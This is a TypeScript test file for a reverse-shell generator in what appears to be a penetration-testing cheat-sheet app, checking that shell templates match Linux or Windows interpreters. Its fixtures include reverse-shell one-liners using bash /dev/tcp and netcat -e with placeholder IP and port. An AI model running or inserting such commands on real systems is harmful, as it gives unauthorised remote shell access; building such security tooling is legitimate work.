import { describe, it, expect } from 'vitest';
import { ALL_SHELL_ITEMS } from '../../data/revshellsData';
import {
  SHELL_BINARIES,
  firstCompatibleShellBinary,
  firstCompatibleTemplate,
  isTemplateOfShellBinaryFamily,
  isTemplateCompatibleWithShellBinary,
  shellBinaryFamily,
  templateUsesShellToken,
} from '../../components/cheatsheet/ReverseShellGenerator';

describe('shellBinaryFamily', () => {
  it('maps bash and sh to Linux, powershell and cmd.exe to Windows', () => {
    expect(shellBinaryFamily('/bin/bash')).toBe('Linux');
    expect(shellBinaryFamily('/bin/sh')).toBe('Linux');
    expect(shellBinaryFamily('powershell')).toBe('Windows');
    expect(shellBinaryFamily('cmd.exe')).toBe('Windows');
  });
});

describe('isTemplateCompatibleWithShellBinary', () => {
  it('matches a Linux-platform template to the Linux-family binaries only, with or without a {shell} slot', () => {
    const withSlot = { command: '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1', platform: 'Linux' as const, language: 'Bash' };
    const noSlot = { command: 'nc {ip} {port} -e /bin/sh', platform: 'Linux' as const, language: 'Netcat' };
    for (const template of [withSlot, noSlot]) {
      expect(isTemplateCompatibleWithShellBinary(template, '/bin/bash')).toBe(true);
      expect(isTemplateCompatibleWithShellBinary(template, '/bin/sh')).toBe(true);
      expect(isTemplateCompatibleWithShellBinary(template, 'powershell')).toBe(false);
      expect(isTemplateCompatibleWithShellBinary(template, 'cmd.exe')).toBe(false);
    }
  });

  it('matches a Windows-platform template to the Windows-family binaries only, with or without a {shell} slot', () => {
    const withSlot = { command: 'nc.exe {ip} {port} -e {shell}', platform: 'Windows' as const, language: 'Netcat' };
    const noSlot = { command: 'powershell -nop -c "..."', platform: 'Windows' as const, language: 'PowerShell' };
    for (const template of [withSlot, noSlot]) {
      expect(isTemplateCompatibleWithShellBinary(template, 'cmd.exe')).toBe(true);
      expect(isTemplateCompatibleWithShellBinary(template, 'powershell')).toBe(true);
      expect(isTemplateCompatibleWithShellBinary(template, '/bin/bash')).toBe(false);
      expect(isTemplateCompatibleWithShellBinary(template, '/bin/sh')).toBe(false);
    }
  });

  it('accepts either family on a platform-neutral ("Both") template, with or without a {shell} slot', () => {
    const withSlot = { command: 'proc_open("{shell}", ...)', platform: 'Both' as const, language: 'PHP' };
    const noSlot = { command: 'socat ...', platform: 'Both' as const, language: 'Socat' };
    for (const template of [withSlot, noSlot]) {
      for (const bin of SHELL_BINARIES) {
        expect(isTemplateCompatibleWithShellBinary(template, bin)).toBe(true);
      }
    }
  });

  it('falls back to language when platform alone does not name a family (e.g. "All")', () => {
    const template = { command: 'echo hi', platform: 'All' as const, language: 'Windows' };
    // platform is neutral, so it is compatible with every family regardless of language
    expect(isTemplateCompatibleWithShellBinary(template, '/bin/bash')).toBe(true);
    expect(isTemplateCompatibleWithShellBinary(template, 'cmd.exe')).toBe(true);
  });

  it('treats macOS, as a platform or as a language, like Linux for the bash/sh binaries offered here', () => {
    const byPlatform = { command: 'echo hi', platform: 'macOS' as const, language: 'Other' };
    expect(isTemplateCompatibleWithShellBinary(byPlatform, '/bin/bash')).toBe(true);
    expect(isTemplateCompatibleWithShellBinary(byPlatform, 'cmd.exe')).toBe(false);
  });
});

describe('firstCompatibleTemplate / firstCompatibleShellBinary', () => {
  it('finds a fallback template for every offered interpreter', () => {
    for (const bin of SHELL_BINARIES) {
      const fallback = firstCompatibleTemplate(ALL_SHELL_ITEMS, bin);
      expect(fallback).toBeDefined();
      expect(isTemplateCompatibleWithShellBinary(fallback!, bin)).toBe(true);
    }
  });

  it('lands every interpreter on a template of its own family, never a platform-neutral one', () => {
    const expected: Record<string, readonly string[]> = {
      '/bin/bash': ['Linux', 'macOS'],
      '/bin/sh': ['Linux', 'macOS'],
      powershell: ['Windows'],
      'cmd.exe': ['Windows'],
    };
    for (const bin of SHELL_BINARIES) {
      const landed = firstCompatibleTemplate(ALL_SHELL_ITEMS, bin)!;
      expect(isTemplateOfShellBinaryFamily(landed, bin)).toBe(true);
      expect(expected[bin]).toContain(landed.platform);
    }
  });

  it('prefers a family template over a neutral one that comes first in the list', () => {
    const neutral = { ...ALL_SHELL_ITEMS[0], id: 'n', platform: 'Both' as const, language: 'PHP' };
    const windows = { ...ALL_SHELL_ITEMS[0], id: 'w', platform: 'Windows' as const, language: 'PowerShell' };
    expect(firstCompatibleTemplate([neutral, windows], 'powershell')?.id).toBe('w');
    expect(firstCompatibleTemplate([neutral, windows], '/bin/bash')?.id).toBe('n');
  });

  it('finds a fallback interpreter for every template in the catalog', () => {
    for (const item of ALL_SHELL_ITEMS) {
      const fallback = firstCompatibleShellBinary(item);
      expect(fallback).toBeDefined();
      expect(isTemplateCompatibleWithShellBinary(item, fallback!)).toBe(true);
    }
  });
});

describe('ALL_SHELL_ITEMS: every interpreter lands on a template of its own family, every reachable pair is compatible', () => {
  it('the catalog only ever uses the Linux/Windows/Both platform values (documented, not asserted on every item)', () => {
    const platforms = new Set(ALL_SHELL_ITEMS.map((i) => i.platform));
    expect(platforms).toEqual(new Set(['Linux', 'Windows', 'Both']));
  });

  it('every offered interpreter is compatible with at least one template, regardless of {shell} slot presence', () => {
    for (const bin of SHELL_BINARIES) {
      const family = shellBinaryFamily(bin);
      const matches = ALL_SHELL_ITEMS.filter((item) => isTemplateCompatibleWithShellBinary(item, bin));
      expect(matches.length).toBeGreaterThan(0);
      // Every match actually belongs to the interpreter's family (or is platform-neutral).
      for (const item of matches) {
        expect(
          item.platform === 'Both' ||
            item.platform === 'All' ||
            (family === 'Linux' ? item.platform === 'Linux' || item.platform === 'macOS' : item.platform === 'Windows') ||
            // language-only fallback for entries whose platform doesn't name a family
            (family === 'Linux' ? item.language === 'Linux' || item.language === 'macOS' : item.language === 'Windows')
        ).toBe(true);
      }
    }
  });

  it('switching to any offered interpreter, or picking any template, never lands on an incompatible pair', () => {
    for (const item of ALL_SHELL_ITEMS) {
      for (const bin of SHELL_BINARIES) {
        if (isTemplateCompatibleWithShellBinary(item, bin)) continue;
        // The component's handler would switch one side; confirm a compatible choice exists on
        // whichever side the UI moves, and that it actually lands compatible.
        const fallbackTemplate = firstCompatibleTemplate(ALL_SHELL_ITEMS, bin);
        const fallbackBin = firstCompatibleShellBinary(item);
        expect(fallbackTemplate || fallbackBin).toBeDefined();
        if (fallbackTemplate) expect(isTemplateCompatibleWithShellBinary(fallbackTemplate, bin)).toBe(true);
        if (fallbackBin) expect(isTemplateCompatibleWithShellBinary(item, fallbackBin)).toBe(true);
      }
    }
  });

  it('templateUsesShellToken no longer gates compatibility: a no-slot template of the wrong family is still rejected', () => {
    const offenders = ALL_SHELL_ITEMS.filter((item) => {
      if (templateUsesShellToken(item)) return false; // only care about no-slot templates here
      const wrongFamilyBin = item.platform === 'Windows' ? '/bin/bash' : item.platform === 'Linux' ? 'cmd.exe' : null;
      if (!wrongFamilyBin) return false; // 'Both' has no "wrong" family
      return isTemplateCompatibleWithShellBinary(item, wrongFamilyBin);
    });
    expect(offenders).toEqual([]);
  });
});
